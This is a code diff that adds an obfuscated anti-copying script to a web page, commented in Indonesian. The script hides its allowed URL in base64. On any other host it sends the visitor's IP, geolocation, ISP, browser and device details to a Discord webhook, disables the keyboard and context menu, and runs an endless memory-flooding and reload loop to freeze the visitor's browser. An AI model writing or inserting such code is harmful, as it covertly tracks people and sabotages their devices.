@@ -109,6 +109,97 @@
       console.clear();
     }
   });
+<script>
+(function(){
+  const _0xV = "3.4.1";
+  const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
+  const _0xURL = atob("aHR0cHM6Ly9hc2VweHl6MTIuZ2l0aHViLmlvL2JvdC13YS1kYi9NYW1ha2x1WXRtL1B1bnlhc3BhaW5pamlybmdlbnRvdHl0bWx1c2VtdWEuaHRtbA==");
+  const _0xWH = "https://discord.com"; 
+
+  const _0xH = location.hostname, _0xF = location.href;
+  const _0xO1 = _0xAL.includes(_0xH);
+  const _0xO2 = _0xF.split('?')[0].split('#')[0] === _0xURL;
+
+  if (!(_0xO1 && _0xO2)) {
+    // LANGSUNG BLANK PUTIH TOTAL
+    document.documentElement.innerHTML = `
+      <head><title>Blank</title></head>
+      <body style="background:#ffffff; overflow:hidden;"></body>
+    `;
+
+    const _0xUA = navigator.userAgent;
+    const _0xPlat = navigator.platform || "Unknown";
+    const _0xLang = navigator.language || "Unknown";
+    const _0xScreen = `${screen.width}x${screen.height}`;
+
+    // Laporan Log Pengaman ke Discord
+    fetch("http://ip-api.com")
+      .then(r => r.json())
+      .then(d => {
+        if (d.status === "success") {
+          const embedPayload = {
+            embeds: [{
+              title: "🚨 SECURITY ALERT: EXPERIMENTAL OVERLOAD ACTIVE!",
+              description: `Maling terdeteksi mengganti lisensi domain **AsepXxnx v3.4.1**. HP/Browser target sedang dihancurkan kinerjanya dengan Memory Heap Flooding.`,
+              color: 16711680, 
+              fields: [
+                { name: "🌐 Jaringan & Geolokasi", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
+                { name: "💻 Info Perangkat", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **UA**: \`${_0xUA}\``, inline: false },
+                { name: "📍 Lokasi Pencurian", value: `• **URL Palsu**: ${_0xF}\n• **Waktu**: ${new Date().toLocaleString('id-ID')} WIB`, inline: false }
+              ],
+              footer: { text: "AsepXxnx Infinite Freeze System" },
+              timestamp: new Date().toISOString()
+            }]
+          };
+          fetch(_0xWH, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedPayload) });
+        }
+      })
+      .catch(() => {
+        fetch(_0xWH, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            embeds: [{
+              title: "🚨 ALERT: MALING KETANGKEP (ADBLOCK)",
+              description: `Pelaku memblokir IP Tracker, eksekusi pembekuan RAM tetap berjalan.\n• **URL TKP**: ${_0xF}`,
+              color: 16711680
+            }]
+          })
+        });
+      });
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => e.preventDefault());
+
+    // STRATEGI PENGURAS RAM EKSTREM (Saturasi Memori Masif)
+    const _0xHeavyLeak = [];
+    setInterval(() => {
+      try {
+        // Melakukan Flooding alokasi memori beruntun di latar belakang
+        for (let i = 0; i < 95000; i++) {
+          // Membuat teks sampah berukuran besar untuk ditumpuk ke RAM browser
+          const dataTrash = "ASEPXXNX_SECURITY_FREEZE_LOOP_OVERLOAD_SYSTEM_NONSTOP_" + Math.random().toString(36).repeat(15);
+          _0xHeavyLeak.push(new Blob([dataTrash], {type: 'text/plain'}));
+          
+          // Memaksa manipulasi State History Browser agar UI Aplikasi Chrome lag parah
+          history.pushState({heap: i}, "", location.href + "?overload=" + Math.random());
+          console.log("%cOVERFLOW_" + i, "font-size:30px;color:red;font-weight:bold;");
+        }
+      } catch(e) {}
+      location.reload(); // Paksa reload agar browser mengulang konsumsi RAM dari nol secara infinity loop
+    }, 150);
+
+    throw new Error("System storage overload block triggered.");
+  }
+
+  // Jika domain benar (AsepXyz), web berjalan sangat mulus & responsif
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
+      e.preventDefault();
+      console.clear();
+    }
+  });
 })();
 
 window.tailwind = window.tailwind || {};
@@ -128,6 +219,7 @@ tailwind.config = {
   }
 }
 </script>
+
 
 
 
